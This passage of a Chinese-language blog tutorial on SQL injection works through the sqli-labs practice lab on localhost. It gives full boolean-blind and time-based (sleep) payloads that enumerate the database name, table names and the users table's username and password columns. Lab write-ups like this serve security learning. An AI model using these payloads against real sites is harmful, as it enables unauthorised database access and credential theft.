class="operator">/</span>判断数据库的第一个字符</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))&gt;115 --+ //100为ascii表中的十进制，对应字母s</span></span><br><span class="line"><span class="string">//判断数据库的第二个字符</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断数据库的第三个字符</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),3,1))&gt;100 --+</span></span><br></pre></td></tr></table></figure></div>
+
+<p><em><strong>3、判断当前库的表名</strong></em></p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>猜测当前数据库中是否存在admin表</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from admin) --+</span></span><br><span class="line"><span class="string">1：判断当前数据库中表的个数</span></span><br><span class="line"><span class="string">// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">&gt;</span><span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>：判断每个表的长度</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为<span class="number">6</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+</span></span><br><span class="line"><span class="string">//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">6</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>：判断每个表的每个字符的ascii值</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断第一个表的第一个字符的ascii值</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span></span><br><span class="line"><span class="string">//判断第一个表的第二个字符的ascii值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">--+</span></span><br><span class="line">.........</span><br><span class="line">由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</span><br></pre></td></tr></table></figure></div>
+
+<p><em><strong>4、判断表的字段</strong></em></p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>如果已经证实了存在admin表，那么猜测是否存在username字段</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select username from admin)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1：判断表中字段的个数</span></span><br><span class="line"><span class="string">//判断users表中字段个数是否大于5</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>)<span class="operator">&gt;</span><span class="number">5</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>：判断每个字段的长度</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断第一个字段的长度</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1))&gt;5 --+</span></span><br><span class="line"><span class="string">//判断第二个字段的长度</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>：判断每个字段名字的ascii值</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断第一个字段的第一个字符的ascii</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),1,1))&gt;100 --+</span></span><br><span class="line"><span class="string">//判断第一个字段的第二个字符的ascii</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">--+</span></span><br><span class="line">...........</span><br><span class="line"></span><br><span class="line">由此可判断出users表中存在 id、username、password 字段</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="九、基于时间的盲注-延时注入"><a href="#九、基于时间的盲注-延时注入" class="headerlink" title="九、基于时间的盲注&#x2F;延时注入"></a>九、基于时间的<strong><strong>盲注&#x2F;延时注入</strong></strong></h3><pre><code>    通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用“绝招”--延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。我们以第9关为例，在id=1后面加单引号或者双引号，页面不会发生任何改变，所以我们考虑绝招延时注入。(碰到盲注直接用sqlmap)
+</code></pre>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and sleep(5) --+</span></span><br><span class="line"><span class="string">//观察请求的时间线，大概在5秒以上，说明构造的sleep(5) 语句起作用，可以把这个时间线作为sql 注入的判断依据。</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span> <span class="number">115</span>,sleep(<span class="number">5</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+</span></span><br></pre></td></tr></table></figure></div>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> SQL INJECTION</li>
+        <li><strong>Author:</strong> Luxf1y</li>
+        <li><strong>Created at
+                :</strong> 2023-09-09 14:01:51</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-09-09 14:02:31
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://luxfly.net.cn/2023/09/09/SQL-INJECTION/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+            This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+            
+
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/09/08/XSS-Study/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">XSS Study</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">SQL INJECTION</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-INJECTION"><span class="nav-number">1.</span> <span class="nav-text">SQL INJECTION</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2-union%E6%B3%A8%E5%85%A5"><span class="nav-number">1.0.1.</span> <span class="nav-text">一、联合查询(union注入)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.0.2.</span> <span class="nav-text">二、报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81http%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="nav-number">1.0.3.</span> <span class="nav-text">三、http头注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">1.0.4.</span> <span class="nav-text">四、宽字节注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">1.0.5.</span> <span class="nav-text">五、宽字节注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E4%BA%8C%E9%98%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">1.0.6.</span> <span class="nav-text">六、二阶注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%83%E3%80%81sql%E6%B3%A8%E5%85%A5getshell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="nav-number">1.0.7.</span> <span class="nav-text">七、sql注入getshell的几种方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.0.8.</span> <span class="nav-text">八、布尔盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8-%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">1.0.9.</span> <span class="nav-text">九、基于时间的盲注&#x2F;延时注入</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Luxf1y</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.4.4</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex justify-center items-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+        ],
+        containers: ["#swup"],
+    });
+
+    swup.hooks.on("page:view", () => {
+        Global.refresh();
+    });
+
+    // if (document.readyState === "complete") {
+    //
+    // } else {
+    //     document.addEventListener("DOMContentLoaded", () => init());
+    // }
+</script>
+
+
+
+
+
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
